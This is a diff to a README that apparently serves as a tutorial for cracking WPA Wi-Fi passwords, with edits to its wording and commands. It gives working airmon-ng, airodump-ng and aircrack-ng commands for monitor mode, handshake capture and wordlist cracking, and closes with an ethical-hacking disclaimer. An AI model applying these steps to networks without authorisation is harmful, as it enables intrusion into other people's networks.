@@ -1,13 +1,17 @@
 # Instruction
 
-## link youtube video: 
+## link youtube video: https://www.youtube.com/watch?v=jeImlZR2A4w
 
-Find your current interface configuration, you should use a wifi module that have embedded the mopnitor mode functions.
+- [ ] TODO Automated Bash Script to do all the process
+
+
+### Find your current interface configuration, you should use a wifi module that have embedded the monitor mode functions.
+
 
 ***Does my WI-FI supports monitor mode?***
 ---> #https://blog.rottenwifi.com/wifi-monitoring-mode/#Does_My_Wi-fi_Support_Monitor_Mode
 
-run this command to see the available interface on your machine
+run this command to see the available interfaces on your machine
 
 ```
 $ ifconfig
@@ -30,15 +34,15 @@ Use airmon-ng start wlan0 to enable monitor mode on the wireless interface
 $ airmon-ng start wlan0
 ```
 
-Once it's enable run the command to monitor all the Wi-Fi signal nearby
+Once it's enable run the command to monitor all the Wi-Fi signal nearby ***wlan0*** will become wlan0mon due to the previous command
 
 ```
-$airodump-ng wlan0 
+$airodump-ng wlan0mon 
 ```
 
-choose a connection that you want to try
+Choose a connection that you want to try
 
-***I suggest to use meanwhile a file, in which you save notes during all the process, this will be helpful for the next steps.***
+***I suggest to use meanwhile all the process a file, in which you save notes during all the process, this will be helpful for the next steps.***
 
 create a directory, in which you will save the file.cap that will be generated during the dumps.
 
@@ -46,9 +50,11 @@ create a directory, in which you will save the file.cap that will be generated d
 $ mkdir /....
 ```
 
-run the command below to start sniffing the connection, the aim is to find a four handshake made by the modem, when a device disconnects himself from the Wi-Fi.
+run the command below from the folder previous created to start sniffing the connection. 
+The aim is to find a four handshake made by the modem, when a device disconnects himself from the Wi-Fi or request a new authentication or other reason due to the connection standards.
 The command to run contains various option.
-Below the command and details:
+
+Below the command and some details regarding it:
 
 ```
 $ airodump-ng wlan0mon -c 10 --bssid {MAC_ADDRESS} -w ./..{crack.cap}
@@ -86,8 +92,9 @@ If we are lucky there will be a line outputed on the logs from the command airdu
 
 *** Example ***
 
+```
 WPA handshake: {MAC_ADDRESS}
-
+```
 
 Finally it's time to crack
 
@@ -104,3 +111,4 @@ aircrack-ng -a2 -b {MAC_ADDRESS} -w {wordListPasswordFile} {name}.cap
 
  
 ## Disclaimer: Hacking without permission is illegal. This repo is strictly educational for learning about cyber-security in the areas of ethical hacking and penetration testing so that we can protect ourselves against the real hackers.
+
